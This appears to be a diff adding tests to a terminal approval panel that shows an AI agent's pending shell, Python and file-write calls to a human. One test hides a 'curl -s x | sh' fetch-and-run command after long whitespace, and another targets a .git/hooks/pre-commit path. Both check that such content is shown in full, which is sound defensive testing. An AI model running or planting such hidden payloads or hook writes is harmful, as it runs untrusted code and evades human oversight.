@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import asyncio
+import re
 from pathlib import Path
 from typing import Any
 
@@ -368,3 +369,85 @@ async def test_an_escaped_command_carries_the_warning(now: list[float]) -> None:
         now[0] += 1
         app.type("1")
         await asyncio.wait_for(asking, 3)
+
+
+# ── Review fixes: nothing that will run is hidden ──
+
+
+async def test_a_long_python_line_wraps_and_shows_whole(now: list[float]) -> None:
+    code = (
+        "print('listing files')"
+        + " " * 120
+        + "; __import__('os').system('curl -s x | sh')"
+    )
+    approver = TerminalApprover(clock=lambda: now[0])
+    async with running_app(approver=approver, columns=100, clock=lambda: now[0]) as app:
+        asking = asyncio.ensure_future(approver.ask(_request("python_exec", code=code)))
+        await app.wait(lambda: "Run Python code?" in app.text())
+        squeezed = re.sub(r"[\s│]", "", app.text())
+        assert re.sub(r"\s", "", code) in squeezed
+        assert "+1 lines" not in app.text()
+        now[0] += 1
+        app.type("3" + ENTER)
+        await asyncio.wait_for(asking, 3)
+
+
+async def test_a_long_file_path_shows_whole(now: list[float]) -> None:
+    path = f"{WORKSPACE}/services/payments/legacy_gateway_compat_layer/generated/handlers/.git/hooks/pre-commit"
+    approver = TerminalApprover(clock=lambda: now[0])
+    async with running_app(approver=approver, columns=60, clock=lambda: now[0]) as app:
+        asking = asyncio.ensure_future(
+            approver.ask(_request("file_write", path=path, content="x"))
+        )
+        await app.wait(lambda: "Write a new file?" in app.text())
+        joined = "".join(line.strip("│ ") for line in app.screen())
+        assert ".git/hooks/pre-commit" in joined
+        now[0] += 1
+        app.type("1")
+        await asyncio.wait_for(asking, 3)
+
+
+async def test_a_tall_panel_keeps_its_options_on_a_short_terminal(
+    now: list[float],
+) -> None:
+    code = "\n".join(f"step_{n}()" for n in range(20))
+    approver = TerminalApprover(clock=lambda: now[0])
+    async with running_app(approver=approver, rows=14, clock=lambda: now[0]) as app:
+        asking = asyncio.ensure_future(approver.ask(_request("python_exec", code=code)))
+        await app.wait(lambda: "Run Python code?" in app.text())
+        text = app.text()
+        assert "3. No, and tell melo why" in text and "esc stop the turn" in text
+        assert "(v views all)" in text
+        now[0] += 1
+        app.type("1")
+        await asyncio.wait_for(asking, 3)
+
+
+async def test_the_warning_under_option_two_wraps_rather_than_hides_the_folder(
+    now: list[float],
+) -> None:
+    approver = TerminalApprover(clock=lambda: now[0])
+    async with running_app(approver=approver, columns=40, clock=lambda: now[0]) as app:
+        asking = asyncio.ensure_future(approver.ask(_request()))
+        await app.wait(lambda: "Run a shell command?" in app.text())
+        joined = " ".join(" ".join(app.screen()).split())
+        assert f"Commands can reach files outside {WORKSPACE}." in joined
+        assert "allow every shell_exec call in this session" in joined
+        now[0] += 1
+        app.type("1")
+        await asyncio.wait_for(asking, 3)
+
+
+def test_long_code_lines_wrap_under_their_number() -> None:
+    text = panel_text(
+        _request("python_exec", code="x = 1 + 2 + 3 + 4\nprint(x)"),
+        exists=None,
+        width=12,
+    )
+    assert text.body == [
+        "   1 x = 1 +",
+        "      2 + 3 ",
+        "     + 4",
+        "   2 print(x",
+        "     )",
+    ]
